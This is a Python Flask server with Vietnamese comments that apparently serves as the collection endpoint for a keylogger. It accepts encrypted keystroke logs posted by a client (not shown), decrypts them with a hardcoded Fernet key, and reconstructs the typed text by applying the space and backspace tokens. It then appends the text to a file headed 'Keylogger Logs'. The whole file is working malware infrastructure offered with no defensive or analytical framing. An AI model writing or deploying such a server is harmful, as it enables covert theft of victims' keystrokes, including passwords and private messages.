from flask import Flask, request
import base64
from cryptography.fernet import Fernet
import os

app = Flask(__name__)

# Khóa mã hóa Fernet (phải giống với client)
encryption_key = b'X9w43Qkdw3439fkeudkjd9kXnFAk3FxpdCQq0J1kWxs='  # Sử dụng cùng khóa với client
cipher_suite = Fernet(encryption_key)

# Đường dẫn tới file lưu trữ log
log_file_path = 'keylogs.txt'

def write_to_logfile(decrypted_log):
    """Ghi log đã giải mã vào file văn bản mà không có timestamp."""
    with open(log_file_path, 'a') as log_file:
        log_file.write(f"{decrypted_log}\n")  # Ghi raw log vào file

@app.route('/log', methods=['POST'])
def receive_log():
    """Nhận log đã mã hóa từ client, giải mã và lưu vào file."""
    try:
        # Lấy dữ liệu log đã mã hóa (Base64)
        encrypted_log_b64 = request.form.get('log')

        if not encrypted_log_b64:
            return "Không có dữ liệu log", 400

        # Giải mã Base64
        encrypted_log = base64.urlsafe_b64decode(encrypted_log_b64)

        # Giải mã dữ liệu
        decrypted_log = cipher_suite.decrypt(encrypted_log).decode('utf-8')

        # Xử lý ký tự "back" và "space"
        processed_log = ""
        i = 0
        while i < len(decrypted_log):
            if decrypted_log[i:i+5] == "space":  # Nếu gặp "space"
                processed_log += ' '  # Thay thế bằng khoảng trắng
                i += 5  # Bỏ qua chuỗi "space"
            elif decrypted_log[i:i+4] == "back":  # Nếu gặp "back"
                if processed_log:  # Nếu processed_log không rỗng
                    processed_log = processed_log[:-1]  # Xóa ký tự cuối cùng
                i += 4  # Bỏ qua chuỗi "back"
            else:
                processed_log += decrypted_log[i]  # Thêm ký tự vào processed_log
                i += 1  # Di chuyển đến ký tự tiếp theo
        
        # Ghi log đã giải mã vào file
        write_to_logfile(processed_log)

        return "Log nhận và giải mã thành công", 200
    except Exception as e:
        return f"Xử lý log thất bại: {e}", 500

if __name__ == '__main__':
    # Đảm bảo file log tồn tại
    if not os.path.exists(log_file_path):
        with open(log_file_path, 'w') as log_file:
            log_file.write("Keylogger Logs\n")
            log_file.write("=================\n")

    # Chạy ứng dụng Flask trên port 5000
    app.run(host='0.0.0.0', port=5000)
